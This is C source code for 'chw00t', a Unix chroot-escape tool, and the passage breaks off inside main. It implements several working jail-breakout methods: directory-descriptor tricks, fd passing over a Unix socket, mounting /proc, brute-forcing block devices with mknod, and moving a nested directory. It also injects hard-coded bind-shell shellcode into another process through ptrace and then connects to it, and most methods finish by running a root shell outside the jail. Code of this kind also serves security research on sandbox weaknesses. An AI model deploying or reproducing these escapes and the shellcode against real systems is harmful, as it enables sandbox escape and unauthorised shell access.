/*
 * ----------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * Balazs Bucsay wrote this file.  As long as you retain this notice you
 * can do whatever you want with this stuff. If we meet some day, and you think
 * this stuff is worth it, you can buy me a beer in return.    chroot@rycon.hu
 * (Lincense is stolen from Poul-Henning Kamp)
 * ----------------------------------------------------------------------------
 */

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/un.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <dirent.h>
#include <getopt.h>
#include <fcntl.h>

#define MAX_DEPTH	255
#define OPEN_MAX	255
#define SHELLNUM	11
#define FSNUM		6
#define UNIX_PATH_MAX   108
#define SOCKETNAME	"#anonsocket"
#define PID_MAX		65535 // 2^16-1
#define BUFLEN		255*16

// symlinks on shells could result in segfault on solaris
char *shells[] = {"/bin/bash", "/bin/sh", "/bin/dash", "/bin/ksh",
        "/bin/csh", "/usr/bin/sh", "/usr/bin/bash", 
        "/usr/bin/ksh", "/usr/bin/csh", "/usr/bin/dash",
        "/usr/bin/zsh" };

// based on the examples form http://www.thomasstover.com/uds.html
int send_fd(int socket, int fd_to_send)
{
    struct msghdr socket_message;
    struct iovec io_vector[1];
    struct cmsghdr *control_message = NULL;
    char message_buffer[1];
    char ancillary_element_buffer[CMSG_SPACE(sizeof(int))];
    int available_ancillary_element_buffer_space;

    /* at least one vector of one byte must be sent */
    message_buffer[0] = 'F';
    io_vector[0].iov_base = message_buffer;
    io_vector[0].iov_len = 1;

    /* initialize socket message */
    memset(&socket_message, 0, sizeof(struct msghdr));
    socket_message.msg_iov = io_vector;
    socket_message.msg_iovlen = 1;

    /* provide space for the ancillary data */
    available_ancillary_element_buffer_space = CMSG_SPACE(sizeof(int));
    memset(ancillary_element_buffer, 0, 
	available_ancillary_element_buffer_space);
    socket_message.msg_control = ancillary_element_buffer;
    socket_message.msg_controllen = available_ancillary_element_buffer_space;

    /* initialize a single ancillary data element for fd passing */
    control_message = CMSG_FIRSTHDR(&socket_message);
    control_message->cmsg_level = SOL_SOCKET;
    control_message->cmsg_type = SCM_RIGHTS;
    control_message->cmsg_len = CMSG_LEN(sizeof(int));
    *((int *) CMSG_DATA(control_message)) = fd_to_send;

    return sendmsg(socket, &socket_message, 0);
}

int recv_fd(int socket)
{
    int sent_fd, available_ancillary_element_buffer_space;
    struct msghdr socket_message;
    struct iovec io_vector[1];
    struct cmsghdr *control_message = NULL;
    char message_buffer[1];
    char ancillary_element_buffer[CMSG_SPACE(sizeof(int))];

    /* start clean */
    memset(&socket_message, 0, sizeof(struct msghdr));
    memset(ancillary_element_buffer, 0, CMSG_SPACE(sizeof(int)));

    /* setup a place to fill in message contents */
    io_vector[0].iov_base = message_buffer;
    io_vector[0].iov_len = 1;
    socket_message.msg_iov = io_vector;
    socket_message.msg_iovlen = 1;

    /* provide space for the ancillary data */
    socket_message.msg_control = ancillary_element_buffer;
    socket_message.msg_controllen = CMSG_SPACE(sizeof(int));

    if(recvmsg(socket, &socket_message, 0) < 0)
    return -1;

    if(message_buffer[0] != 'F')
    {
	/* this did not originate from the above function */
	return -1;
    }

    if((socket_message.msg_flags & MSG_CTRUNC) == MSG_CTRUNC)
    {
	/* we did not provide enough space for the ancillary element array */
	return -1;
    }

    /* iterate ancillary elements */
    for(control_message = CMSG_FIRSTHDR(&socket_message);
    control_message != NULL;
    control_message = CMSG_NXTHDR(&socket_message, control_message))
    {
	if( (control_message->cmsg_level == SOL_SOCKET) &&
	    (control_message->cmsg_type == SCM_RIGHTS) )
	{
	    sent_fd = *((int *) CMSG_DATA(control_message));
	    return sent_fd;
	}
    }

    return -1;
}

void putdata(pid_t child, long addr,
             char *str, int len)
{   char *laddr;
    int i, j;
    union u {
            long val;
            char chars[4];
    }data;
    i = 0;
    j = len / 4;
    laddr = str;
    while(i < j) {
        memcpy(data.chars, laddr, 4);
        ptrace(PTRACE_POKEDATA, child,
               addr + i * 4, data.val);
        ++i;
        laddr += 4;
    }
    j = len % 4;
    if(j != 0) {
        memcpy(data.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, child,
               addr + i * 4, data.val);
    }
}

void usage(char *tool)
{
    
    printf("Usage of chw00t - Unices chroot breaking tool:\n\n"
	"[*] Methods:\n"
	"    -0\tClassic\n"
	"    -1\tClassic with saved file descriptor\n"
	"    -2\tUnix domain socket\n"
	"    -3\tMount /proc\n"
	"    -4\tMake block device (mknod) /proc\n"
	"    -5\tMove out of chroot (nested)\n"
	"    -6\tPtrace x32 for 32bit processes (Linux only)\n"
#if __x86_64__
	"    -7\tPtrace x64 for 64bit processes (Linux only)\n"
#endif
	"    -9\tOpen filedescriptor (demo purposes)\n"
	"\n"
	"[*] Paramaters:\n"
	"    --pid PID\t\tPID to ptrace\n"
	"    --port PORT\t\tPort for listening (default: 4444)\n"
	"    --dir NAME\t\tChroot directory name\n"
	"    --nestdir NAME\tNested chroot directory name\n"
	"    --tempdir NAME\tNew temporary directory name\n\n"
	"[*] Miscellaneous:\n"
	"    --help/-h\tThis help\n\n");
}

int movetotheroot()
{
    int i;

    for (i = 0; i < MAX_DEPTH; i++)
    {
	if (chdir(".."))
	    return 0xDEADBEEF;
    }

    return 0;
}

int classic(char *dir) {
    int err, i;
    struct stat dirstat;
    
    printf("clssic\n");
    if ((err = stat(dir, &dirstat)) == 0) 
    {
	printf("[-] %s exists, please remove\n", dir);
	return 0xDEADBEEF;
    }
    
    printf("[+] creating %s directory\n", dir);
    if (mkdir(dir, 0700))
    {
	printf("[-] error creating %s\n", dir);
	return 0xDEADBEEF;
    }

    printf("[+] chrooting to %s\n", dir);
    if (chroot(dir))
    {
	printf("[-] chroot failed to %s\n", dir);
	return 0xDEADBEEF;
    }
	
    printf("[+] change working directory to real root\n");
    if (movetotheroot())
    {
	printf("[-] chdir failed to real root\n");
	return 0xDEADBEEF;
    }
	

    printf("[+] chrooting to real root\n");
    if (chroot("."))
    {
	printf("[-] chroot failed\n");
	return 0xDEADBEEF;
    }
    
    for (i=0; i<SHELLNUM; i++)
    {
	if ((err = stat(shells[i], &dirstat)) == 0)
	{
	    return execl(shells[i], NULL, NULL);
	}
    }

    return 0;
}

int classicfd(char *dir) {
    int err, i, fd;
    struct stat dirstat;
    DIR *dird;
    
    if ((err = stat(dir, &dirstat)) == 0) 
    {
	printf("[-] %s exists, please remove\n", dir);
	return 0xDEADBEEF;
    }
    
    printf("[+] creating %s directory\n", dir);
    if (mkdir(dir, 0700))
    {
	printf("[-] error creating %s\n", dir);
	return 0xDEADBEEF;
    }
    
    printf("[+] opening %s directory\n", dir);
    if ((dird = opendir(".")) == NULL)
    {
	printf("[-] error opening %s\n", dir);
	return 0xDEADBEEF;
    }

    printf("[+] P: change working directory to: %s\n", dir);
    if (chdir(dir))
    {
	printf("[-] P: cannot change directory\n");	
	return 0xDEADBEEF;
    }

    printf("[+] chrooting to %s\n", dir);
    if (chroot("."))
    {
	printf("[-] chroot failed to %s\n", dir);
	return 0xDEADBEEF;
    }

    printf("[+] change back to the start directory\n");
    if (fchdir(dirfd(dird)))
    {
	printf("[-] cannot change directory\n");
	return 0xDEADBEEF;
    }
	
    printf("[+] change working directory to real root\n");
    if (movetotheroot())
    {
	printf("[-] chdir failed to real root\n");
	return 0xDEADBEEF;
    }

    printf("[+] chrooting to real root\n");
    if (chroot("."))
    {
	printf("[-] chroot failed\n");
	return 0xDEADBEEF;
    }
    
    for (i=0; i<SHELLNUM; i++)
    {
	if ((err = stat(shells[i], &dirstat)) == 0)
	{
	    return execl(shells[i], NULL, NULL);
	}
    }

    return 0;
}

int uds(char *dir) 
{
    int err, i, fd, fd2, socket_fd, connection_fd;
    struct stat dirstat;
    pid_t pid;
    DIR *dird;
    struct sockaddr_un addr;
    socklen_t addr_length;
    
    if ((err = stat(dir, &dirstat)) == 0) 
    {
	printf("[-] %s exists, please remove\n", dir);
	return 0xDEADBEEF;
    }
    
    printf("[+] creating %s directory\n", dir);
    if (mkdir(dir, 0700))
    {
	printf("[-] error creating %s\n", dir);
	return 0xDEADBEEF;
    }

    printf("[+] forking...\n");
    pid = fork();

    /* pid != 0 -> parent, create socket, opendir, 
       send fd to child thru unix domain socket 
       pid == 0 -> child, create socket, get fd from parent, breakout */
    if (pid)
    {
	printf("[+] P: change working directory to: %s\n", dir);
	if (chdir(dir))
	{
	    printf("[-] P: cannot change directory\n");	
	    return 0xDEADBEEF;
	}
	
	printf("[+] P: chrooting to %s\n", dir);
	if (chroot("."))
	{
	    printf("[-] P: chroot failed to %s\n", dir);
	    return 0xDEADBEEF;
	}
	printf("[+] P: is sleeping for one second\n");
	sleep(1);

        printf("[+] P: creating socket\n");
        if ((socket_fd = socket(PF_UNIX, SOCK_STREAM, 0)) < 0)
	{
	    printf("[-] P: error creating socket\n");
            return 0xDEADBEEF;
        }
        memset(&addr, 0, sizeof(struct sockaddr_un));
        addr.sun_family = AF_UNIX;
        snprintf(addr.sun_path, UNIX_PATH_MAX, "%s", SOCKETNAME);
	// seting abstract named socket here, to be accessible from chroot
	// could be standard uds as well, just putting it under the new chroot
	addr.sun_path[0] = 0;

	printf("[+] P: connecting socket\n");
	if (connect(socket_fd, (struct sockaddr *)&addr, 
	    sizeof(struct sockaddr_un)))
	{
	    printf("[-] P: error connecting socket\n");
                        return 0xDEADBEEF;
	}

	printf("[+] P: receiving file descriptor thru unix domain socket\n");
	if ((fd = recv_fd(socket_fd)) == -1)
	{
	    printf("[-] P: error receiving file descriptor\n");
                        return 0xDEADBEEF;
	}
	
	printf("[+] P: duplicating file descriptor\n");
	if ((fd2 = dup(fd)) == -1)
	{
	    printf("[-] P: error duplicating fd\n");
                        return 0xDEADBEEF;
	}

	printf("[+] P: change back to the start directory\n");
	if (fchdir(fd))
	{
	    printf("[-] P: cannot change directory: %s\n", strerror(errno));
	    return 0xDEADBEEF;
	}
	
	printf("[+] P: change working directory to real root\n");
	if (movetotheroot())
	{
	    printf("[-] P: cannot change directory\n");
	    return 0xDEADBEEF;
	}

	printf("[+] P: chrooting to real root\n");
	if (chroot(".") != 0)
	{
	    printf("[-] P: chroot failed\n");
	    return 0xDEADBEEF;
	}
    
        printf("[+] P: closing socket\n");
        close(socket_fd);

	for (i=0; i<SHELLNUM; i++)
	{
	    if ((err = stat(shells[i], &dirstat)) == 0)
	    {
		return execl(shells[i], NULL, NULL);
	    }
	}

	return 0;
    }
    else
    {
	printf("[+] C: opening %s directory\n", dir);
        if ((dird = opendir(".")) == NULL)
        {
	    printf("[-] C: error opening %s\n", dir);
	    return 0xDEADBEEF;
	}

	printf("[+] C: creating socket\n");
	if ((socket_fd = socket(PF_UNIX, SOCK_STREAM, 0)) < 0)
	{
	    printf("[-] C: error creating socket\n");
		    return 0xDEADBEEF;
	}
	memset(&addr, 0, sizeof(struct sockaddr_un));
	addr.sun_family = AF_UNIX;
	snprintf(addr.sun_path, UNIX_PATH_MAX, "%s", SOCKETNAME);
	addr.sun_path[0] = 0;

	printf("[+] C: binding socket\n");
	if(bind(socket_fd, (struct sockaddr *)&addr, 
	    sizeof(struct sockaddr_un)) != 0)
	{
	    printf("[-] C: error bind on socket\n");
            return 0xDEADBEEF;
	}
	
	printf("[+] C: listening on socket\n");
	if (listen(socket_fd, 5))
	{
	    printf("[-] C: error listen on socket\n");
            return 0xDEADBEEF;
	}

	printf("[+] C: waiting for connection\n");
	if ((connection_fd = accept(socket_fd, (struct sockaddr *)&addr, 
	    &addr_length)) == -1)
	{
	    printf("[-] C: error accepting connection\n");
            return 0xDEADBEEF;
	}

	printf("[+] C: sending %s's file descriptor thru unix "
		"domain socket\n", dir);
	if (send_fd(connection_fd, dirfd(dird)) == -1)
	{
	    printf("[-] C: sending fd thru unix domain socket failed\n");
            return 0xDEADBEEF;
	}
	sleep(1);
	printf("[+] C: closing sockets\n");
	close(connection_fd);
	close(socket_fd);
	printf("[+] C: exiting\n");
    }

    return 0;

}

int mountproc(char *dir) 
{
    int err, i, fd;
    pid_t pid;
    struct stat ownstat, otherstat;
    DIR *dird;
    struct dirent *pdirent;
    char *rootname; // "/proc/$pid$/root"
    
    pid = getpid();
    if ((rootname = malloc(8+sizeof(unsigned long long)+strlen(dir))) == NULL)
    {
	printf("[-] Error allocating memory\n");
	return 0xDEADBEEF;
    }
    memset(rootname, 0, 8+sizeof(unsigned long long)+strlen(dir));
    sprintf(rootname, "/%s/%llu/root", dir, (unsigned long long)pid);
    
    printf("[+] looking for /proc\n");
    if ((err = stat(dir, &ownstat)) != 0) 
    {
	printf("[+] %s is not created, creating one\n", dir);
	if (mkdir(dir, 0555))
	{
	    printf("[-] error creating %s\n", dir);
	    return 0xDEADBEEF;
	}
    }
    
    if ((err = stat(rootname, &ownstat)) != 0) 
    {
	printf("[+] %s is created, mounting procfs\n", dir);
	if (mount("proc", dir, "proc", 0, NULL))
	{
	    printf("[-] error mounting %s: %s\n", dir, strerror(errno));
	    return 0xDEADBEEF;
	}
	if ((err = stat(rootname, &ownstat)) != 0) 
	{
	    printf("[-] cannot find my own root: %s\n", strerror(errno));
	    return 0xDEADBEEF;
	}
    }

    if ((dird = opendir(dir)) == NULL)
    {
	printf("[-] error opening %s: %s\n", dir, strerror(errno));
	return 0xDEADBEEF;
    }

    while ((pdirent = readdir(dird)) != NULL)
    {
	i = 12 + strlen(pdirent->d_name);
	if ((rootname = realloc(rootname, 
	    8+strlen(dir)+strlen(pdirent->d_name))) == NULL)
	{
	    printf("[-] Error reallocating memory\n");
	    return 0xDEADBEEF;
	}
	sprintf(rootname, "/%s/%s/root", dir, pdirent->d_name);
	if ((strncmp(pdirent->d_name, ".", 1)) && 
	    ((err = stat(rootname, &otherstat)) == 0)) 
	{
	    if (otherstat.st_ino != ownstat.st_ino)
	    {
		if ((dird = opendir(rootname)) != NULL)
		    break;
	    } 
	}
    }
    
    printf("[+] change back to the start directory\n");
    if (fchdir(dirfd(dird)))
    {
	printf("[-] cannot change directory\n");
	return 0xDEADBEEF;
    }
	
    printf("[+] chrooting to real root\n");
    if (chroot("."))
    {
	printf("[-] chroot failed\n");
	return 0xDEADBEEF;
    }
    
    free(rootname);
    for (i=0; i<SHELLNUM; i++)
    {
	if ((err = stat(shells[i], &ownstat)) == 0)
	{
	    return execl(shells[i], NULL, NULL);
	}
    }

    return 0;
}

int makeblockdevice(char *devdir, char *mountdir)
{
    int err, i, j, h, fd;
    struct stat dirstat;
    DIR *dird;
    struct dirent *pdirent;
    char *shellname = NULL, *devname = NULL;
    char *filesystems[] = {"ext4", "ext3", "ext2", "zfs",
	    "ufs", "ufs2" };

    printf("[+] looking for %s\n", devdir);
    if ((err = stat(devdir, &dirstat)) != 0) 
    {
	printf("[+] %s is not created, creating one\n", devdir);
	if (mkdir(devdir, 0555))
	{
	    printf("[-] error creating %s\n", devdir);
	    return 0xDEADBEEF;
	}
	
    }
    
    printf("[+] looking for %s\n", mountdir);
    if ((err = stat(mountdir, &dirstat)) != 0) 
    {
	printf("[+] %s is not created, creating one\n", mountdir);
	if (mkdir(mountdir, 0555))
	{
	    printf("[-] error creating %s\n", mountdir);
	    return 0xDEADBEEF;
	}
    }
    if ((devname = malloc(strlen(devdir)+9)) == NULL)
    {
	printf("[-] error allocating memory\n");
        return 0xDEADBEEF;
    }
    sprintf(devname, "/%s/chw00t", devdir);

    // crawling for hda, hda, hdc - 3 block
    for (i=0; i<196; i++)
    {
	if (mknod(devname, S_IFBLK, makedev(3, i)) != 0)
	{
	    printf("[-] error creating block device: %s\n", strerror(errno));
	}
	for (j=0;j<FSNUM;j++)
	{
	    if (!mount(devname, mountdir, filesystems[j], 0, NULL))
		{   
		for (h=0; h<SHELLNUM; h++)
		{
                    if ((shellname = realloc(shellname, strlen(mountdir)+
                        strlen(shells[h])+1)) == NULL)
                    {   
                        printf("[-] error reallocating memory\n");
                        return 0xDEADBEEF;
                    }   
                    memset(shellname, 0, strlen(mountdir)+strlen(shells[h])+1);
                    sprintf(shellname, "%s%s", mountdir, shells[h]);
                    if (!stat(shellname, &dirstat)) 
                    {
                        if (!chdir(mountdir) && !chroot("."))
                        {
			    free(shellname);
			    return execl(shells[h], NULL, NULL);
			}
                    }
		}
		umount(mountdir);
		}
	}
	unlink(devname);
    }
    // crawling for sd[a-p] - 8 block
    for (i=0; i<256; i++)
    {
	if (mknod(devname, S_IFBLK, makedev(8, i)) != 0)
	{
	    printf("[-] error creating block device: %s\n", strerror(errno));
	}
	for (j=0;j<FSNUM;j++)
	{
	    if (!mount(devname, mountdir, filesystems[j], 0, NULL))
		{   
		for (h=0; h<SHELLNUM; h++)
		{
		    if ((shellname = realloc(shellname, strlen(mountdir)+
			strlen(shells[h])+1)) == NULL)
		    {
			printf("[-] error reallocating memory\n");
			return 0xDEADBEEF;
		    }
		    memset(shellname, 0, strlen(mountdir)+strlen(shells[h])+1);
		    sprintf(shellname, "%s%s", mountdir, shells[h]);
		    if (!stat(shellname, &dirstat)) 
		    {
			if (!chdir(mountdir) && !chroot("."))
                        {
			    free(shellname);
			    return execl(shells[h], NULL, NULL);
			}
		    }
		}
		umount(mountdir);
		}
	}
	unlink(devname);
    }
    
    return 0;

}

int ptracepid(unsigned long long pid, int x64, unsigned int port) 
{
    pid_t traced_process;
    struct user_regs_struct regs, newregs;
    int socketfd, nready;
    struct sockaddr_in serv_addr;
    struct timeval ts;
    fd_set fds;
    unsigned char buf[BUFLEN+1]; 
    int rv, one = 1;
    
    int len_x86 = 78;
    char shellcode_x86[] =
    	"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
    	"\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"
    	"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
    	"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
    	"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
    	"\x0b\xcd\x80";
    
    int len_x64 = 86;
    char shellcode_x64[] = 
	"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
	"\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
	"\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
	"\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
	"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
	"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

    if (port)
    {
#if __x86_64__
	shellcode_x64[20] = (port >> 8) & 0xFF;
	shellcode_x64[21] = port & 0xFF;
#else
	shellcode_x86[21] = (port >> 8) & 0xFF;
	shellcode_x86[22] = port & 0xFF;
#endif
    }
    else port = 4444;


    if (!pid)
    {
	// looking for a process, starting from our PID
	for (pid=getppid()-2;pid>2;pid--) 
	{
	    if (!kill(pid, 0))
	    {
		printf("[+] Found pid: %llu\n", pid);
   		printf("[+] PTRACE: attach process: %llu\n", pid);
    		traced_process = pid;
    		if (ptrace(PTRACE_ATTACH, traced_process, NULL, NULL))
    		{
		    printf("[-] error attaching process\n");
		    continue;
		}
		break;
	    }
	}
    }
    else
    {
	printf("[+] PTRACE: attach process: %llu\n", pid);
	traced_process = pid;
	if (ptrace(PTRACE_ATTACH, traced_process, NULL, NULL))
	{
	    printf("[-] error attaching process\n");
	    return 0xDEADBEEF;
	}
    }
    wait(NULL);
    if (ptrace(PTRACE_GETREGS, traced_process, NULL, &regs))
    {
        printf("[-] error getting registers\n");
        return 0xDEADBEEF;
    }
    
    printf("[+] PTRACE: overwrite original bytecode\n");
#if __x86_64__
    if (x64) 
    {
	putdata(traced_process, regs.rip,
	    shellcode_x64, len_x64);
    }
    else 
    {
	putdata(traced_process, regs.rip,
            shellcode_x86, len_x86);
    }
#else
    putdata(traced_process, regs.eip,
        shellcode_x86, len_x86);
#endif
    printf("[+] PTRACE: detach and sleep\n");
    if (ptrace(PTRACE_DETACH, traced_process, NULL, NULL))
    {
        printf("[-] error detaching process\n");
        return 0xDEADBEEF;
    }
    printf("[+] connecting to bindshell\n");

    sleep(1);
    if ((socketfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
	printf("[-] error@socket\n");
	return 0xDEADBEEF;
    }

    setsockopt(socketfd, SOL_TCP, TCP_NODELAY, &one, sizeof(one));
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    serv_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (connect(socketfd, (struct sockaddr *) &serv_addr, 
	sizeof(serv_addr)) <0)
    {
	printf("[-] error@connect: %s\n", strerror(errno));
	return 0xDEADBEEF;
    }
    printf("[+] Connected!\n");

    ts.tv_sec = 1; // 1 second
    ts.tv_usec = 0;

    while (1) {
        FD_ZERO(&fds);
        if (socketfd != 0)
        FD_SET(socketfd, &fds);
        FD_SET(0, &fds);
 
        nready = select(socketfd + 1, &fds, (fd_set *) 0, (fd_set *) 0, &ts);
        if (nready < 0) {
            perror("select. Error");
            return 1;
        }
        else if (nready == 0) {
            ts.tv_sec = 1; // 1 second
            ts.tv_usec = 0;
        }
        else if (socketfd != 0 && FD_ISSET(socketfd, &fds)) 
	{
            // start by reading a single byte
	    memset(buf, 0, BUFLEN);
            if ((rv = recv(socketfd, buf, BUFLEN, 0)) < 0)
                return 1;
            else if (rv == 0) 
	    {
                printf("Connection closed by the remote end\n\r");
                return 0;
            }
 
        printf("%s", buf);
        }
        else if (FD_ISSET(0, &fds)) 
	{
        rv = read(fileno(stdin), buf, BUFLEN);
            if (send(socketfd, buf, rv, 0) < 0)
                return 1;
        }
    }
    close(socketfd);

    return 0;
}

int moveooc(char *chrootdir, char *nesteddir, char *newdir) 
{
    int err, i;
    struct stat dirstat;
    pid_t pid;
    char *childdir = NULL;

    if ((childdir = malloc(strlen(chrootdir)+strlen(nesteddir)+2)) == NULL)
    {
	printf("[-] error allocating memory\n");
	return 0xDEADBEEF;
    }
    sprintf(childdir, "%s/%s", chrootdir, nesteddir);

    if ((err = stat(chrootdir, &dirstat)) == 0) 
    {
	printf("[-] %s exists, please remove\n", chrootdir);
	return 0xDEADBEEF;
    }
    if ((err = stat(newdir, &dirstat)) == 0)
    {
	printf("[-] %s exists, please remove\n", newdir);
	return 0xDEADBEEF;
    }
    
    printf("[+] creating %s directory\n", chrootdir);
    if (mkdir(chrootdir, 0700))
    {
	printf("[-] error creating %s\n", chrootdir);
	return 0xDEADBEEF;
    }

    printf("[+] creating %s directory\n", childdir);
    if (mkdir(childdir, 0700))
    {
	printf("[-] error creating %s\n", childdir);
	rmdir(chrootdir);
	return 0xDEADBEEF;
    }

    printf("[+] forking...\n");
    pid = fork();

    if (pid)
    {	
	
	printf("[+] 0: change working directory to: %s\n", chrootdir);
	if (chdir(chrootdir) != 0)
	{
	    printf("[-] 0: cannot change directory\n");	
	    return 0xDEADBEEF;
	}
	
	printf("[+] 0: chrooting to %s\n", chrootdir);
	if (chroot(".") != 0)
	{
	    printf("[-] 0: chroot failed to %s\n", chrootdir);
	    return 0xDEADBEEF;
	}
	
	printf("[+] 0: change working directory to: %s\n", nesteddir);
	if (chdir(nesteddir) != 0)
	{
	    printf("[-] 0: cannot change directory\n");	
	    return 0xDEADBEEF;
	}

	printf("[+] 0: sleeping for 2 seconds\n");
	sleep(2);

	printf("[+] 0: change working directory to real root\n");
	if (movetotheroot())
	{
	    printf("[-] 0: cannot change directory ../\n");
	    return 0xDEADBEEF;
	}

	printf("[+] 0: chrooting to real root\n");
	if (chroot(".") != 0)
	{
	    printf("[-] 0: chroot failed\n");
	    return 0xDEADBEEF;
	}
	
	free(childdir);

	for (i=0; i<SHELLNUM; i++)
	{
	    if ((err = stat(shells[i], &dirstat)) == 0)
	    {
		return execl(shells[i], NULL, NULL);
	    }
	}
    }
    else
    {
	printf("[+] 1: is sleeping for one second\n");
	sleep(1);
	printf("[+] 1: mv %s to %s\n", childdir, newdir);
	rename(childdir, newdir);
	
	return 0;
    }

    return 0;
}

/*
    This one is only for demo purposes. Looks like identical as the classicfd()
    but it "emulates" a scenario where the process forks and does not close all
    the file descriptors. In case the chrooted process has open directory file
    descriptors, the process can break out the chroot. This should be 
    implemented as a shellcode.
*/
int fddemo(char *dir)
{
    DIR *dird, *dird2;
    int size, i, fd, err;
    struct stat fdstat;

    if ((dird = opendir(".")) == NULL)
    {
	printf("[-] error openening /etc: %s\n", strerror(errno));
    }

    printf("[+] looking for %s\n", dir);
    if ((err = stat(dir, &fdstat)) != 0)
    {
        printf("[+] %s is not created, creating one\n", dir);
        if (mkdir(dir, 0700))
        {
            printf("[-] error creating %s\n", dir);
            return 0xDEADBEEF;
        }
    }

    if (chdir(dir) != 0) 
    {
	printf("[-] error changing directort: %s\n", strerror(errno));
    }

    if (chroot(".") != 0) 
    {
	printf("[-] error chrooting: %s\n", strerror(errno));
    }

    size = getdtablesize();
    if (size == -1) size = OPEN_MAX;
    for (i = 0; i < size; i++)
    {
	if (fstat(i, &fdstat) == 0)
	{
	    if (S_ISREG(fdstat.st_mode)) printf("[!] %d: regular file\n", fd); 
	    if (S_ISDIR(fdstat.st_mode)) printf("[!] %d: directory\n", fd); 
	    if (S_ISCHR(fdstat.st_mode)) printf("[!] %d: character device\n", fd); 
	    if (S_ISBLK(fdstat.st_mode)) printf("[!] %d: block device\n", fd); 
	    if (S_ISFIFO(fdstat.st_mode)) printf("[!] %d: FIFO (named pipe)\n", fd); 
	    if (S_ISLNK(fdstat.st_mode)) printf("[!] %d: symbolic link\n", fd); 
	    if (S_ISSOCK(fdstat.st_mode)) printf("[!] %d: socket\n", fd); 

	    if (S_ISDIR(fdstat.st_mode)) 
	    {
		printf("[+] found a directory\n");
		if (fchdir(i) != 0) 
		{
		    printf("[-] fchdir error");
		    continue;
		}
		if (movetotheroot()) 
		{
		    printf("[-] chdir error");
		    continue;
		}
		if (chroot(".")) 
		{
		    printf("[-] chroot error");
		    continue;
		}
	        for (i=0; i<SHELLNUM; i++)
		{
		    if ((err = stat(shells[i], &fdstat)) == 0)
		    {
			return execl(shells[i], NULL, NULL);
		    }
		}
	    }
	}
    }
    
    return 0;

}

int main(int argc, char **argv)
{
    int o, option_index = 0, method = -1;
    unsigned long long pid_arg = 0;
    unsigned int port_arg = 0;
    char *dir1_arg = NULL, *dir2_arg = NULL, *dir3_arg = NULL;
    opterr = 0;
    static struct option long_options[] =
	{
          {"help",   no_argument,       0, 'h'},
          {"0",   no_argument,       0, '0'},
          {"1",   no_argument,       0, '1'},
          {"2",   no_argument,       0, '2'},
          {"3",   no_argument,       0, '3'},
          {"4",   no_argument,       0, '4'},
          {"5",   no_argument,       0, '5'},
          {"6",   no_argument,       0, '6'},
#if __x86_64__
          {"7",   no_argument,       0, '7'},
#endif
          {"9",   no_argument,       0, '9'},
          {"pid",  required_argument, 0, 'p'},
          {"port",  required_argument, 0, 'P'},
          {"dir",  required_argument, 0, 'd'},
          {"nestdir",    required_argument, 0, 'n'},
          {"tempdir",    required_argument, 0, 't'},
          {0, 0, 0, 0}
        };
    while (1)
    {
	o = getopt_long(argc, argv, "012345679hp:P:d:n:m:", long_options, 
	    &option_index);
	if (o == -1) break;
	
	switch(o)
	{
	    case 'h':
		usage(argv[0]);
		break; 
	    case 'p':
		pid_arg = atoll(optarg);
		break;
	    case 'P':
		port_arg = atoi(optarg);
		break;
	    case 'd':
		dir1_arg = optarg;
		break;
	    case 'n':
		dir2_arg = optarg;
		break;
	    case 't':
		dir3_arg = optarg;
		break;
	    case '0':
		method = 0;
		break;
	    case '1':
		method = 1;
		break;
	    case '2':
		method = 2;
		break;
	    case '3':
		method = 3;
		break;
	    case '4':
		method = 4;
		break;
	    case '5':
		method = 5;
		break;
	    case '6':
		method = 6;
		break;
#if __x86_64__
	    case '7':
		method = 7;
		break;
#endif
	    case '9':
		method = 9;
		break;
	    case '?':
		if (!((optopt == 'p') || (optopt == 'P') ||
		    (optopt == 'd') || (optopt == 'n') ||
		    (optopt == 't')))
		    printf("[-] Unknown option: %c\n\n", optopt);
		else if (optopt == 'p')
		    printf("[-] Option pid requires a parameter\n\n");
		else if (optopt == 'P')
		    printf("[-] Option port requires a parameter\n\n");
		else if (optopt == 'd')
		    printf("[-] Option dir requires a parameter\n\n");
		else if (optopt == 'n')
		    printf("[-] Option nestdir requires a parameter\n\n");
		else if (optopt == 't')
		    printf("[-] Option tempdir requires a parameter\n\n");
		break;
	    default:
		usage(argv[0]);
		break;
	}
    }
    if (!argv[1]) 
    {
	usage(argv[0]);
	return 0;
    }
    switch(method)
    {
        case 0:
            if (dir1_arg)
                return classic(dir1_arg);
            else
                printf("[-] Missing argument: --dir\n\n");
            break;
        case 1:
            if (dir1_arg)
		return classicfd(dir1_arg);
            else
                printf("[-] Missing argument: --dir\n\n");
            break;
        case 2:
            if (dir1_arg)
		return uds(dir1_arg);
            else
                printf("[-] Missing argument: --dir\n\n");
            break;
        case 3:
            if (dir1_arg)
		return mountproc(dir1_arg);
            else
                printf("[-] Missing argument: --dir\n\n");
            break;
        case 4:
            if (dir1_arg && dir3_arg)
		return makeblockdevice(dir1_arg, dir3_arg);
            else
